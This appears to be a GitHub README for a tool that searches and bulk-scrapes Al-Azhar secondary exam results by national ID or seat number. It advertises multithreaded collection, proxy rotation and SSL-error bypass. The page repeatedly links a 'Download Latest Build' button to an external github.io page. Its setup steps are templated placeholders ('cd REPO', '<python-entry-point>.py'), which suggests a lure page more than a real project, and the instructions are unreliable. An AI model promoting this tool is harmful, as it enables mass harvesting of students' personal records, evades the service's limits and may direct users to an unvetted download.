# Azhar Natiga Scraper - Al-Azhar Results Search and Scraping Tool 2026

> **Azhar Natiga Scraper is a browser-based utility for searching and collecting Al-Azhar secondary school exam results by national ID or seat number. This build is prepared for the 2026 results cycle.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evanwardlgl6798/azhar-natiga-scraper-2026?style=flat-square)](https://github.com/evanwardlgl6798/azhar-natiga-scraper-2026)

---

<p align="center">
  <a href="https://evanwardlgl6798.github.io/azhar-natiga-scraper-2026/">
    <img src="https://img.shields.io/badge/Download-Azhar%20Natiga%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download Azhar Natiga Scraper">
  </a>
</p>

> **[Download Azhar Natiga Scraper Latest](https://evanwardlgl6798.github.io/azhar-natiga-scraper-2026/)**

---

[Download Latest Build](https://evanwardlgl6798.github.io/azhar-natiga-scraper-2026/)

---

## Overview

Azhar Natiga Scraper offers a responsive Arabic interface for retrieving Al-Azhar secondary exam results. A result can be requested using either a national ID or a seat number. For larger collection tasks, its scraping workflow can process requests concurrently.

The project pairs a browser-facing HTML interface with proxy implementations for Python and Node.js. Retrieved data can be written automatically to UTF-8-SIG CSV files, while a terminal progress bar provides ongoing activity updates. Proxy switching, request retries, CORS support, and SSL certificate error handling are available for setups that need them.

---

## What It Provides

- Retrieve Al-Azhar exam records with a national ID or seat number
- Process broader result collections using multiple threads
- Write collected data to UTF-8-SIG encoded CSV output
- Switch between proxies and retry unsuccessful requests
- Display live scraping progress in the terminal
- Operate a local proxy through either Python or Node.js
- Accommodate CORS limitations and SSL certificate errors
- Search through a responsive Arabic-language web interface

---

## Getting Started

First download the repository and move into the project folder:

```bash
git clone https://github.com/evanwardlgl6798/azhar-natiga-scraper-2026.git
cd REPO
```

Install dependencies for the runtime you plan to use. Python users can run:

```bash
python -m pip install -r requirements.txt
```

For the Node.js implementation, install the package dependencies with:

```bash
npm install
```

The HTML interface may be opened directly in a browser. If the environment requires a proxy, launch the applicable Python or Node.js local proxy service described by the project files before searching.

---

## Using the Tool

1. Launch a local proxy service when it is needed for your browser or network.
2. Load the responsive Arabic search page.
3. Provide either a national ID or a seat number.
4. Send the request and inspect the returned result.
5. When collecting multiple records, set the required proxy and concurrency options.
6. Track request processing through the terminal progress bar.
7. Open the generated CSV file to review stored results.

Depending on the selected runtime, a command-line session may use one of these entry points:

```bash
python <python-entry-point>.py
```

or:

```bash
node <node-entry-point>.js
```

Replace the placeholder with the actual entry-point filename present in the checked-out project.

---

## Settings

Scraper and proxy behavior is controlled through the project configuration files or the environment values supplied for the chosen runtime. Example settings include:

```env
THREADS=4
PROXY_ROTATION=true
RETRY_COUNT=3
OUTPUT_ENCODING=utf-8-sig
```

Available variable names and accepted values are determined by the configuration included in the current build. Consult those files before modifying thread counts, retry behavior, proxy rotation, CORS handling, or SSL-related options.

---

## System Requirements

- A current web browser for the Arabic search page
- Python or Node.js for proxy and scraping operation
- Network connectivity to the applicable exam-results service
- Enough disk space to store CSV output
- A terminal that can render progress information
- Proxy settings when the surrounding network requires them

---

## Frequently Asked Questions

### Can both national IDs and seat numbers be used?

Yes. The interface accepts either type of identifier for result searches.

### What format is used for saved results?

Collected records are saved automatically as CSV files encoded with UTF-8-SIG. This encoding works well with spreadsheet software and Arabic text.

### Is Python the only supported runtime?

No. The project provides local proxy choices for both Python and Node.js. Select the option appropriate for your environment and use its setup process.

### How do I control request concurrency?

Adjust the available thread or concurrency settings. More simultaneous requests may place additional demands on the network and proxy, and can influence how often retries occur.

### What can I do when a search does not succeed?

Check network access first, then confirm the proxy configuration and retry settings. Depending on the environment, you may also need to review CORS and SSL certificate handling.

### Where can I find newer builds?

Review the repository and the latest build link for new releases, configuration updates, and revised runtime directions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
